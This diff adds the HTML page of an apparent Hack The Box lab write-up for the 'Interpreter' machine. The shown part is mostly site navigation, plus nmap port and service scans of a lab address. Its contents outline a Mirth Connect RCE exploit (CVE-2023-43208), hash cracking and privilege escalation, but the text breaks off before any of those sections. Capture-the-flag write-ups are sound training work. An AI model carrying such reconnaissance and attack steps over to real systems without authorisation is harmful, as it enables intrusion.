@@ -1,0 +1,2116 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../../insane/windows/a/">
+      
+      
+        <link rel="next" href="../../windows/signed/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/logo.jpg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Interpreter - hyperc</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#interpreter" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="hyperc" class="md-header__button md-logo" aria-label="hyperc" data-md-component="logo">
+      
+  <img src="../../../../../assets/images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hyperc
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Interpreter
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="red"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="hyperc" class="md-nav__button md-logo" aria-label="hyperc" data-md-component="logo">
+      
+  <img src="../../../../../assets/images/logo.jpg" alt="logo">
+
+    </a>
+    hyperc
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hyperc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Methodology
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../tooling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tooling Stack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack the box
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hack the box
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Machines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../easy/linux/Soulmate/Write%20Up/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../hard/linux/a/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../insane/linux/a/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insane
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_1_4" id="__nav_5_1_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_5_1_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1_4_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5_1_4_1" id="__nav_5_1_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_5_1_4_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5_1_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Interpreter
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Interpreter
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ports
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sCV
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Findings:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DNS Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Directory Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2023-43208-mirth-connect-rce-poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2023-43208-mirth-connect-rce-poc
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CVE-2023-43208-mirth-connect-rce-poc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#penelope-443" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penelope 443
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2023-43208-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2023-43208-EXPLOIT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mariadb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MariaDB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identifying-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identifying hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hashcat
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-user-sedric" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to User sedric
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation to User sedric">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#system-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to Root
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../windows/signed/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../../hack-the-box-lives/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack the box lives
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ports" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Ports
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scv" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        sCV
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Findings:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dns-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DNS Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#directory-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Directory Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cve-2023-43208-mirth-connect-rce-poc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2023-43208-mirth-connect-rce-poc
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CVE-2023-43208-mirth-connect-rce-poc">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#penelope-443" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penelope 443
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cve-2023-43208-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CVE-2023-43208-EXPLOIT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mariadb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MariaDB
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#identifying-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Identifying hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hashcat
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-user-sedric" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to User sedric
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation to User sedric">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#system-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-to-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation to Root
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    hyperc
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../easy/linux/Soulmate/Write%20Up/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Hack the box
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../easy/linux/Soulmate/Write%20Up/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Machines
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Medium
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Linux
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="interpreter">Interpreter</h1>
+<h3 id="ports">Ports</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.95 scan initiated Sat Feb 21 14:05:26 2026 as: /usr/lib/nmap/nmap --privileged -p- -Pn -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt 10.129.3.94</span>
+<span class="ne">Warning</span><span class="p">:</span> <span class="mf">10.129.3.94</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.3.94</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.18</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65181</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">350</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">https</span>
+<span class="mi">6661</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">unknown</span>
+</code></pre></div>
+<h3 id="scv">sCV</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.95 scan initiated Sat Feb 21 14:06:46 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -sC -v -oN nmap_sVsC.txt 10.129.3.94</span>
+<span class="n">Increasing</span> <span class="n">send</span> <span class="n">delay</span> <span class="k">for</span> <span class="mf">10.129.3.94</span> <span class="kn">from</span> <span class="mi">0</span> <span class="n">to</span> <span class="mi">5</span> <span class="n">due</span> <span class="n">to</span> <span class="mi">35</span> <span class="n">out</span> <span class="n">of</span> <span class="mi">115</span> <span class="n">dropped</span> <span class="n">probes</span> <span class="n">since</span> <span class="n">last</span> <span class="n">increase</span><span class="o">.</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.3.94</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.19</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>      <span class="n">OpenSSH</span> <span class="mf">9.2</span><span class="n">p1</span> <span class="n">Debian</span> <span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span> <span class="p">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
